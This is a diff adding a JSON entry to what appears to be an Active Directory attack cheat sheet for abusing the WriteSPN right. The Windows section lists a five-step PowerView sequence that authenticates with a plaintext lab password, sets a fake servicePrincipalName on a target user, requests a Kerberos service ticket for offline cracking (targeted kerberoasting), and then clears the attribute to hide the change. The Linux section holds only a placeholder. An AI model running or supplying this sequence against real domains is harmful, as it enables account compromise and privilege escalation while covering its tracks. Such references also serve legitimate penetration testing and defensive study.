@@ -1,0 +1,44 @@
+{
+    "WriteSPN": {
+        "meaning": "The ability to write directly to the servicePrincipalNames attribute on a user object.",
+        "common": "",
+        "windows": {
+            "PowerView": [
+                {
+                    "order": 1,
+                    "command": "$SecPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force",
+                    "description": "Create secure password credential"
+                },
+                {
+                    "order": 2,
+                    "command": "$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\\\\dfm.a', $SecPassword)",
+                    "description": "Create PSCredential object for authentication"
+                },
+                {
+                    "order": 3,
+                    "command": "Set-DomainObject -Credential $Cred -Identity harmj0y -SET @{serviceprincipalname='nonexistent/BLAHBLAH'}",
+                    "description": "Set servicePrincipalName attribute on target user"
+                },
+                {
+                    "order": 4,
+                    "command": "Get-DomainSPNTicket -Credential $Cred harmj0y | fl",
+                    "description": "Request service ticket for kerberoasting"
+                },
+                {
+                    "order": 5,
+                    "command": "Set-DomainObject -Credential $Cred -Identity harmj0y -Clear serviceprincipalname",
+                    "description": "Clean up - clear servicePrincipalName attribute"
+                }
+            ]
+        },
+        "linux": {
+            "Impacket": [
+                {
+                    "order": 1,
+                    "command": "# Linux equivalent would require tools like impacket or similar",
+                    "description": "No direct Linux equivalent provided in source material"
+                }
+            ]
+        }
+    }
+}
